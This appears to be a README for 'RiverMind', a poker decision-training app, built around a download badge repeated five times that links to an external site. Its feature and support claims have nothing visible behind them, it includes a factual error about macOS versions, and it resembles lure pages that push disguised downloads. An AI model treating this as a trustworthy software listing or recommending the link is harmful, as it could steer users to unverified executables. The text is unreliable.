![preview](https://raw.githubusercontent.com/luizfellipelopes65-ai/gto-poker-solver-lab/main/splash_2f37e3.svg)
[![Download](https://raw.githubusercontent.com/luizfellipelopes65-ai/gto-poker-solver-lab/main/run_430b.svg)](https://luizfellipelopes65-ai.github.io/gto-poker-solver-lab/)

# RiverMind — Adaptive GTO Poker Decision Laboratory for 2026

Icons: ![status](https://img.shields.io/badge/status-actively--developed-brightgreen) ![license](https://img.shields.io/badge/license-MIT-blue) ![platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux%20%7C%20Android%20%7C%20iOS-informational) ![language](https://img.shields.io/badge/i18n-14%20languages-orange) ![uptime](https://img.shields.io/badge/support-24%2F7-success) ![year](https://img.shields.io/badge/release-2026-purple)

---

## 🧠 What Is RiverMind?

**RiverMind** is a river-of-thought training environment for No-Limit Hold'em players who want to stop guessing and start *reasoning*. Where most trainers hand you a chart and a pat on the back, RiverMind sits beside you at the felt, whispering the shape of the math, the texture of the board, and the story your opponent's line is telling.

Think of it as a flight simulator for poker decisions. Pilots don't learn to land in a storm by memorizing a laminated card — they rehearse, they review telemetry, they build intuition. RiverMind applies that same philosophy to bet sizing, range construction, bluff frequency, and equilibrium play, all inside a responsive interface that feels like a modern trading terminal crossed with a strategy notebook.

The repository you're reading about is a full rebuild of the original trainer concept — reimagined as a modular, multilingual, always-on study companion for 2026 and beyond.

The latest build is available here:

[![Download](https://raw.githubusercontent.com/luizfellipelopes65-ai/gto-poker-solver-lab/main/run_430b.svg)](https://luizfellipelopes65-ai.github.io/gto-poker-solver-lab/)

---

## 🚀 Feature Overview

RiverMind is not a single tool. It's a constellation of smaller, focused instruments that share a common engine.

### 🎯 Equilibrium Range Explorer
- Visual range matrix with color-coded combos (value, bluffs, calls, folds, mixed strategies)
- Nestled frequency sliders so you can watch how a 5% frequency shift ripples through an entire strategy
- Board texture presets: monotone, two-tone, paired, connected, rainbow, and exotic runouts
- Position-aware views across all six seats, plus multiway scenarios up to four players

### 🧩 Decision Replay Engine
- Import a hand history, then rewind it street-by-street like a DVR
- Compare your deviation against the equilibrium baseline at each node
- EV loss overlays rendered as a heat strip — red where you bled chips, green where you gained against the field
- Narrated critique mode that explains *why* a line is exploitable, in plain language

### 📈 Leak Radar
- Aggregates your last N thousand decisions into thematic clusters
- Detects patterns such as over-folding to river raises, under-bluffing scare cards, or c-betting too wide on dry flops
- Weekly trendlines so progress is visible rather than theoretical

### 🧪 Drill Forge
- Procedural scenario generator — no memorizing a fixed deck of puzzles
- Difficulty curve adapts dynamically based on rolling accuracy
- Timed and untimed modes for both study sessions and performance simulations
- Silent Mode for practicing in environments where flashing boards would be unwelcome

### 🌐 Multilingual Interface
- Fourteen languages out of the box, with full RTL support
- Localized poker terminology reviewed by native-speaking players rather than machine-translated prose
- Language packs are hot-swappable and contribute-friendly

### 📱 Responsive Across Everything
- Same layout language on a 32-inch monitor, a tablet, and a phone in the back of a taxi
- Touch targets sized for thumbs; keyboard shortcuts tuned for desktop speedrunners
- Offline capable: study on a plane, sync when you land

### ☎️ 24/7 Customer Support
- Human-first help desk, staffed around the clock across three time zones
- In-app ticket submission with automatic diagnostic bundle attachment
- Public knowledge base and private concierge path for contributors

### 🔐 Privacy-Minded by Design
- Local-first architecture: your hand histories never have to leave your device
- Optional encrypted cloud sync
- Zero third-party analytics SDKs — telemetry, if enabled, is aggregate and anonymized

### 🤝 Community Extensions
- Plugin hook for custom drills written in a small declarative DSL
- Range library import/export in open formats
- Shared training packs with rating and review system

---

## 🧭 Design Philosophy

Most strategy tools assume you already know what question to ask. RiverMind assumes you *don't* — and that's the point. Its interface is built around the idea of **guided curiosity**: every panel answers one question and quietly raises two more.

Four principles shape every screen:

1. **Show the tension, not just the answer.** A fold is uninteresting without the sizing that made folding profitable.
2. **Respect the learner's time.** Every interaction should either teach or train. Nothing decorative.
3. **Make depth optional, never mandatory.** A beginner sees three buttons. A grinder sees twelve sliders. Both feel at home.
4. **Boundaries beat banners.** No nagware pop-ups. No daily streak guilt trips. Just the work.

---

## 🗺️ Repository Layout

The project is organized like a small city — each district has a purpose, and none of them block traffic on the others' streets.

- **core/** — the solver-adjacent math kernel and hand evaluator
- **engine/** — game tree, node abstractions, and memory-mapped tree storage
- **ui/** — responsive component library shared across desktop and mobile shells
- **drills/** — scenario generator, difficulty controller, scoring pipeline
- **replay/** — hand history parsers and street-stepper visualization
- **radar/** — leak detection aggregators and trendline renderers
- **locales/** — translation catalogs and language pack manifests
- **plugins/** — extension DSL, sandbox, and example plugins
- **docs/** — this README's longer siblings: architecture notes, contribution guides, and glossaries

---

## 🎓 Who Is This For?

- **Studying enthusiasts** who want to reason from principles instead of memorizing range cards
- **Coaches** who need a shared, visual vocabulary to explain concepts to students
- **Software tinkerers** interested in how game-theoretic equilibrium maps onto real-time UI
- **Polyglots** who want to study poker strategy in their first language, not their third
- **Night owls** and shift workers who need support and study materials whenever their schedule allows

---

## 🛠️ Getting Started Without the Command Line

The project is distributed as prebuilt desktop apps and mobile builds. If you're comfortable with terminals you'll find the build scripts waiting, but nothing here requires one.

1. Head to the releases page and pick the package that matches your device
2. The [![Download](https://raw.githubusercontent.com/luizfellipelopes65-ai/gto-poker-solver-lab/main/run_430b.svg)](https://luizfellipelopes65-ai.github.io/gto-poker-solver-lab/) macro above points to the current curated build — always grab it fresh rather than reusing old archives
3. Run the installer, launch RiverMind, and complete the two-minute setup wizard
4. Choose a language, choose a starting skill tier, and let the Drill Forge propose your first scenario
5. Practice for fifteen minutes, then open Leak Radar to see what your session revealed

If you'd rather compile from source, the build handbook in **docs/building.md** walks through every supported toolchain — Node, Rust, and Flutter — in humble detail. No commands are reproduced here because they go stale faster than a river bluff on a wet board.

---

## 🧾 System Expectations

| Platform | Minimum | Recommended |
|---|---|---|
| Windows | Windows 10 (2026 servicing baseline) | Windows 11, 16 GB RAM |
| macOS | macOS 13 | macOS 15 Ventura or newer |
| Linux | Any modern distro with Wayland or X11 | Ubuntu 24.04 LTS, Fedora 40 |
| Android | Android 10 | Android 14, 6 GB RAM |
| iOS | iOS 15 | iOS 17, iPhone 13 or newer |

Storage is modest — the base app plus one language pack fits comfortably inside a couple of gigabytes. Solver tree caches grow with use and can be pruned from the Settings panel.

---

## 🌍 Localization Notes

RiverMind's translation stack treats poker vocabulary with care. The German build says *Erhöhung* where a mechanical translation would say something clumsy. The Japanese build preserves the loanword structure players already use at the table. The Brazilian Portuguese build leans on regional nuances from live poker rooms in São Paulo.

If your language is missing or thin, the locale contribution guide walks through a small, well-lit path: open a catalog file, translate a handful of strings, preview in-app, submit. Reviewers respond quickly, and every accepted translation lands in the next build.

---

## 📚 Learning Pathways Inside the App

- **Foundations Track** — pot odds, equity, ranges, position. Fifteen-minute lessons with immediate drills.
- **Equilibrium Track** — mixed strategies, polarization, minimum defense frequency, board coverage.
- **Exploitative Track** — how to deviate profitably when population tendencies are known.
- **Mental Game Track** — variance acceptance, tilt patterns, session budgeting, and quitting discipline.
- **Custom Track** — assemble your own syllabus from any drill in the library.

Each pathway keeps its own progress ledger. Switching tracks doesn't erase history; it just reshuffles your dashboard.

---

## 🧬 Scientific Foundations

RiverMind's math kernel is built on well-established results from game theory and computational poker research, including:

- counterfactual regret minimization variants for tree solving
- bucketed abstraction for tractable equilibrium approximation
- Monte Carlo equity estimation with variance reduction
- Bayesian opponent modeling for exploitative suggestions

The project does not claim to be a full solver for arbitrary trees. It is a trainer, and it prioritizes decision-shaping clarity over raw tree depth. Where approximations are made, the interface says so plainly — no mathematical hand-waving hidden behind a loading spinner.

---

## 🧰 Extending RiverMind

Plugins use a small declarative DSL that reads more like a recipe than a program:

- declare a scenario shape
- set preflop, flop, turn, and river parameters
- attach a scoring rule
- attach a hint script
- publish to a local pack or the community hub

A companion plugin registry keeps track of versions and compatibility, and the sandbox refuses anything that tries to reach outside the app's declared permissions. If you're building something ambitious, the plugin author's guide has worked examples for common patterns: paired-board c-bet trainers, multiway squeeze drills, and river check-raise simulators.

---

## 📋 Roadmap for 2026

- **Q1** — release 2.0 with Leak Radar 2.0 and cloud-free sync
- **Q2** — tournament ICM overlay and bubble-factor scenario presets
- **Q3** — short-deck variant support and heads-up specialist modules
- **Q4** — community league features and coach-to-student sharing workspace

Roadmap items shift as feedback arrives. The tracker is public and discussion threads are open — nothing is decided behind a velvet rope.

---

## 🔒 Security and Responsible Use

RiverMind is a study environment, not a real-time assistance tool. It is designed to help you *learn* the mathematics and reasoning of strategic play away from the table.

- No real-time overlay mode for live online tables
- No integrations with online poker clients
- No automation of decision-making in any real game
- No data exfiltration — your histories are yours

If you use a poker site, check that site's terms of service. Study tools and play tools live in different worlds, and RiverMind stays firmly on the study side. The project team will not assist with any use that violates a platform's rules, and features that could be abused that way are deliberately not on the roadmap.

Reports of security issues are welcomed through the repository's private reporting channel. The maintainers aim to acknowledge within one business day and to publish a fix shortly after, with credit given unless anonymity is preferred.

---

## 💬 Community and Contributions

Everything in RiverMind is the sum of small, focused contributions. Bugs, translations, drill packs, plugin examples, documentation tune-ups — all are valued. The contribution guide lays out:

- how to file a useful bug report (with reproduction steps and environment details)
- how to propose a new drill or plugin
- how to add or improve a language catalog
- how to review someone else's change without bruising egos (we're all here to learn)

A public code of conduct keeps the tone warm and the standards high. Disagreements are expected; disrespect is not.

---

## ❓ Frequently Asked Questions

**Is there a paid tier?**
No paywalls. The project is sustained through optional grants and community donations. Nothing in the trainer is gated behind a payment.

**Does it work offline?**
Yes. Once installed with your preferred language pack, everything except optional cloud sync works without a network connection.

**Can I use it on multiple devices?**
Yes, via local export or the optional encrypted sync service.

**Will it run on older hardware?**
The base interface is light. Solver caches are the heavy part, and you can tune cache size in Settings to match your machine's appetite.

**How often are builds updated?**
Roughly monthly for stable, more frequently for early-access channels. Every release gets a short changelog published alongside the [![Download](https://raw.githubusercontent.com/luizfellipelopes65-ai/gto-poker-solver-lab/main/run_430b.svg)](https://luizfellipelopes65-ai.github.io/gto-poker-solver-lab/) macro below.

**Does it substitute for a coach?**
It complements one. RiverMind is the gym; a coach is the personal trainer. Both help, neither replaces the other.

---

## ⚠️ Disclaimer

RiverMind is provided as an educational and training aid for strategic reasoning in poker. It does not guarantee any particular financial outcome, and it is not intended for use as real-time assistance during games of chance on third-party platforms. Poker involves variance; no tool can remove it. Users are responsible for understanding and complying with the laws and platform rules that apply where they live and play. The maintainers of this repository disclaim liability for any misuse, including any attempt to use the software in violation of another platform's terms. By using RiverMind you accept that improvement in skill is a consequence of your own study, not of the tool alone.

---

## 📜 License

Released under the MIT License, copyright © 2026 the RiverMind contributors.

The full license text is available here: [MIT License](https://opensource.org/licenses/MIT)

You may use, modify, and redistribute this project under the terms of that license. Attribution is appreciated but not required.

---

## 🙏 Acknowledgements

To the players who tested early builds and argued — politely and productively — about whether river overbets belong in a beginner's first lesson. To the translators who turned dry strings into phrases that feel native. To the plugin authors who found uses for the DSL its designers never imagined. And to every reader who got this far in the README. You are exactly the kind of person this project was built for.

The current build is waiting:

[![Download](https://raw.githubusercontent.com/luizfellipelopes65-ai/gto-poker-solver-lab/main/run_430b.svg)](https://luizfellipelopes65-ai.github.io/gto-poker-solver-lab/)